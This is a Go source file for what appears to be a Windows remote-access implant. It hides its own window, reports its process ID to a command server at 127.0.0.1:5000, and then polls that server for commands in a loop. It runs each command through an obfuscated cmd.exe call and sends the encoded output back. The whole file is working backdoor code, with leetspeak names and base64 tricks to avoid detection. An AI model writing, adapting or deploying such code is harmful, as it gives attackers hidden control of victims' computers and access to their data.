package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"os/exec"
	"os"
	"encoding/base64"
	"time"
	"syscall"
)

func G3Td4t4() string {
	c3r2point := "http://127.0.0.1:5000/showMSG"
	rsp3, err := http.Get(c3r2point)
	if err != nil {
		fmt.Println("Error:", err)
		return ""
	}
	defer rsp3.Body.Close()
	bdy, err := ioutil.ReadAll(rsp3.Body)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	return cn3ver(string(bdy))
}

func cn3ver(as3iiSt6ing string) string {
	asc1iC0d3s := strings.Fields(as3iiSt6ing)
	var str strings.Builder
	for _, code := range asc1iC0d3s {
		ascii, err := strconv.Atoi(code)
		if err != nil {
			fmt.Println(err)
			continue
		}
		str.WriteString(string(ascii))
	}
	return str.String()
}

func ccncc(d4t4 string) (string, error) {
	c3r2point := "http://127.0.0.1:5000/receiveMSG" 
	resp, err := http.Get(c3r2point + "?d4t4=" + d4t4)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func cew04ker(ce string) string {
	callerTune := "VFJUUlJUUlRSVFJZVFJZVFJFUlRjWVlUVFJSbUhIVVVJSUtLZA=="
	t3t3, _ := base64.StdEncoding.DecodeString(callerTune)
	preTun3 := string(t3t3)
	ha3 := "TRYEHUIK"
	for _, char := range ha3 {
		preTun3 = strings.ReplaceAll(preTun3, string(char), "")
	}
	out, err := exec.Command(preTun3, "/C", ce).Output()
	if err != nil {
		return err.Error()
	}
	return string(out)

}
func str2ascii(s string) string {
	var str strings.Builder
	for i, r := range s {
		str.WriteString(strconv.Itoa(int(r)))
		if i != len(s)-1 {
			str.WriteString(" ")
		}
	}
	return str.String()
}

func dneexec() bool {
	endpoint := "http://127.0.0.1:5000/doneExec"
	resp, err := http.Get(endpoint)
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return false
	}

	if strings.Contains(string(body), "Executed successfully") {
		return true
	} else {
		return false
	}
}

func main() {
	if os.Getenv("BACKGROUND") != "true" {
		cmd := exec.Command("cmd.exe", "/C", "start", "/B", os.Args[0])
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Env = append(os.Environ(), "BACKGROUND=true")
		if err := cmd.Start(); err != nil {
			fmt.Println("Failed to start background process:", err)
			return
		}
		pid := strconv.Itoa(cmd.Process.Pid)
		encodedPid := str2ascii(pid)
		encodedPid = base64.StdEncoding.EncodeToString([]byte(encodedPid))
		ccncc("PID:"+encodedPid)
		return
	}
	for {
		m3ss4g3 := G3Td4t4()
		if m3ss4g3 != "" {
			executed := cew04ker(m3ss4g3)
			executed = str2ascii(executed)
			executed = base64.StdEncoding.EncodeToString([]byte(executed))
			m3ss4g3 = strings.ReplaceAll(m3ss4g3, " ", "_")
			ccncc(m3ss4g3+":"+executed)
			if dneexec() {
				time.Sleep(3 * time.Second)
			}

		time.Sleep(20 * time.Second)

	}
	
}
}
